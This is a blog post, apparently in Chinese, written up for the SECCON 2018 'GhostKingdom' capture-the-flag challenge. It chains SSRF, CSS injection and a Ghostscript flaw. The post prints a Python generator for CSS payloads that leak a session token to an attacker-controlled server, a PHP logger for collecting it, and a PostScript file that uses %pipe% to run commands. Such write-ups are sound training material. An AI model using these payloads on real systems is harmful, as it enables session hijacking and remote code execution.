@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 问题分析题目链接:
+1http://ghostkingdom.pwn.seccon.jp/FLAG/
+访问链接后的提示如下:
+1FLAG is somewhere in this folder.   GO TO TOP
+首先是一个登录界面:
+
+一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。
+登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCON 2018 Qualis GhostKingdom">
+<meta property="og:url" content="http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x00 问题分析题目链接:
+1http://ghostkingdom.pwn.seccon.jp/FLAG/
+访问链接后的提示如下:
+1FLAG is somewhere in this folder.   GO TO TOP
+首先是一个登录界面:
+
+一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。
+登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改x">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd6e42077582.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd6e489ec36b.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd6e6960b699.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd6e6675902f.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd6e7a284b0f.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd719ee71628.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd71b0ff2538.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd722370feba.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd71fe91e67e.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd7217a4e6c3.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd722a10d369.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd722f902495.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd722f8ee474.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/29/5bd723bdf3a02.png">
+<meta property="og:updated_time" content="2018-10-29T15:26:57.342Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SECCON 2018 Qualis GhostKingdom">
+<meta name="twitter:description" content="0x00 问题分析题目链接:
+1http://ghostkingdom.pwn.seccon.jp/FLAG/
+访问链接后的提示如下:
+1FLAG is somewhere in this folder.   GO TO TOP
+首先是一个登录界面:
+
+一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。
+登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改x">
+<meta name="twitter:image" content="https://i.loli.net/2018/10/29/5bd6e42077582.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SECCON 2018 Qualis GhostKingdom</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/10/13/php-audit-tips/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&text=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&is_video=false&description=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON 2018 Qualis GhostKingdom&body=Check out this article: http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&name=SECCON 2018 Qualis GhostKingdom&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-问题分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 问题分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-解题步骤"><span class="toc-number">2.</span> <span class="toc-text">0x01 解题步骤</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SECCON 2018 Qualis GhostKingdom
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-29T15:25:57.000Z" itemprop="datePublished">2018-10-29</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x00-问题分析"><a href="#0x00-问题分析" class="headerlink" title="0x00 问题分析"></a>0x00 问题分析</h3><p>题目链接:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ghostkingdom.pwn.seccon.jp/FLAG/</div></pre></td></tr></table></figure>
+<p>访问链接后的提示如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG is somewhere in this folder.   GO TO TOP</div></pre></td></tr></table></figure>
+<p>首先是一个登录界面:</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd6e42077582.png" alt="屏幕快照 2018-10-29 下午6.41.59.png"></p>
+<p>一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。</p>
+<p>登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改xxf等方式并没有成功，所以猜测可能是cookie认证问题？</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd6e489ec36b.png" alt="屏幕快照 2018-10-29 下午6.44.14.png"></p>
+<p>但或者上传处不是关键点，先从上面两个功能开始测试。首先测试<code>Message to admin</code>，刚开始猜测可能此处会不会有一个xss bot，打个cookie回来。虽然这个输入框也不存在xss，也没有bot周期性地戳一下，但是在burp抓包中分析到一个css参数可控。联想到可能是CSS 注入读数据这个点，但是我还缺少一个从本地戳戳戳的bot！</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd6e6960b699.png" alt="屏幕快照 2018-10-29 下午6.50.11.png"></p>
+<p><img src="https://i.loli.net/2018/10/29/5bd6e6675902f.png" alt="屏幕快照 2018-10-29 下午6.51.21.png"></p>
+<p>此处我们decode一下这个base64可以看到是控制此处的输出样式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~/Desktop  echo -n &quot;c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&quot; | base64 -D</div><div class="line">span&#123;background-color:red;color:yellow&#125;</div></pre></td></tr></table></figure>
+<p>点击send to admin之后我看到一个csrf参数(有用？)</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd6e7a284b0f.png" alt="屏幕快照 2018-10-28 下午10.36.50.png"></p>
+<p>好像无法但从这一个点入手，所以我决定看看<code>Take a screenshot</code>。</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd719ee71628.png" alt="屏幕快照 2018-10-29 下午10.31.41.png"></p>
+<p>很明显是一个ssrf,不过file等协议都被限制了，302跳转好像也没开。虽然限制了127等，但是我们可以通过访问<code>http://0/</code>绕过，结果还是有惊喜的。</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd71b0ff2538.png" alt="屏幕快照 2018-10-29 下午10.36.37.png"></p>
+<p>PS:扫描过程中发现了一个有趣的东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi</div></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/29/5bd722370feba.png" alt="屏幕快照 2018-10-29 下午11.07.14.png"></p>
+<p><strong>小结:</strong></p>
+<p>本来我以为这题是三个点分别突破都可以获取flag，但现在看来不行，真是继承了KeigoYAMAZAKI一贯的出题风格，要综合以上信息，构造利用链来读取flag</p>
+<h3 id="0x01-解题步骤"><a href="#0x01-解题步骤" class="headerlink" title="0x01 解题步骤"></a>0x01 解题步骤</h3><p>首先<code>Take a screenshot</code>处的ssrf可以让我们从<code>local network</code>那里进行登录，登录之后可以操作<code>Upload image</code>。</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd71fe91e67e.png" alt="屏幕快照 2018-10-28 下午10.32.30.png"></p>
+<p>但是仅通过这个有限制的ssrf无法进一步利用了。所以换一个角度考虑，如果我们能够从<code>local network</code>获取<code>CGISESSID</code>在<code>from internet</code>进行登录就可以使用<code>Upload image</code>功能了呢？</p>
+<p>有了这个思路接下来就是获取<code>CGISESSID</code>了，联想到<code>Message to admin</code>还有一个css inject可以用来读取数据，所以就可以ssrf+css inject联合来获取<code>CGISESSID</code>。</p>
+<p>此处可以参考: <a href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html" target="_blank" rel="external">Reading Data via CSS Injection</a></p>
+<p>服务器上使用php开个服务器来记录数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -S 0.0.0.0:2333</div></pre></td></tr></table></figure></p>
+<p>对应的目录下可以放置如下log.php来帮助记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</div><div class="line">$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip</div><div class="line">$filename = $_SERVER[&apos;PHP_SELF&apos;];	//访问者要访问的文件名</div><div class="line">$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数</div><div class="line">$time     =   date(&apos;Y-m-d H:i:s&apos;,time()); //访问时间</div><div class="line">$logadd = &apos;来访时间：&apos;.$time.&apos;--&gt;&apos;.&apos;访问链接：&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;</div><div class="line">// log记录</div><div class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fclose($fh);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>利用脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">CHARLIST = &quot;0123456789&quot; + &quot;abcdef&quot;</div><div class="line">URL = &quot;http://0/?msg=master&amp;action=msgadm2&amp;css=&quot;</div><div class="line">#</div><div class="line">known = &quot;bcc703c0693e6eff894ede&quot;</div><div class="line">buf = &quot;&quot;</div><div class="line">for char in CHARLIST:</div><div class="line">    buf += &quot;&quot;&quot;input[name=&quot;csrf&quot;][value^=&quot;&#123;&#125;&quot;] &#123;&#123;</div><div class="line">background: url(http://your server ip/log.php/&#123;&#125;);</div><div class="line">&#125;&#125;&quot;&quot;&quot;.format(known+char,known+char)</div><div class="line"></div><div class="line">print(URL + base64.b64encode(buf.encode(&apos;utf-8&apos;)).decode(&apos;utf-8&apos;))</div></pre></td></tr></table></figure></p>
+<p>最终可以获取<code>CGISESSID</code>的值<br><img src="https://i.loli.net/2018/10/29/5bd7217a4e6c3.png" alt="屏幕快照 2018-10-29 下午11.04.08.png"></p>
+<p>之后在浏览器中设置上我们获得的<code>CGISESSID</code>，就可以使用<code>Upload image</code>功能了。</p>
+<p><img src="https://i.loli.net/2018/10/29/5bd722a10d369.png" alt="屏幕快照 2018-10-28 下午11.41.21.png"></p>
+<p>测试一下<br><img src="https://i.loli.net/2018/10/29/5bd722f902495.png" alt="屏幕快照 2018-10-29 下午11.10.10.png"></p>
+<p><img src="https://i.loli.net/2018/10/29/5bd722f8ee474.png" alt="屏幕快照 2018-10-29 下午11.10.37.png"></p>
+<p>发现有个<code>Convert to GIF format</code>结合之前我们发现的<code>ghostMagick.cgi</code>很容易想到Ghostscript的rce漏洞。我们将以下代码保存为jpg，上传可以得flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</div><div class="line">legal</div><div class="line">mark /OutputFile (%pipe%cat /var/www/html/FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops</div></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/29/5bd723bdf3a02.png" alt="屏幕快照 2018-10-29 上午12.03.49.png"></p>
+<p><code>SECCON{CSSinjection+GhostScript/ImageMagickRCE}</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-问题分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 问题分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-解题步骤"><span class="toc-number">2.</span> <span class="toc-text">0x01 解题步骤</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&text=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&is_video=false&description=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON 2018 Qualis GhostKingdom&body=Check out this article: http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&title=SECCON 2018 Qualis GhostKingdom"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/10/29/SECCON-2018-Qualis-GhostKingdom/&name=SECCON 2018 Qualis GhostKingdom&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
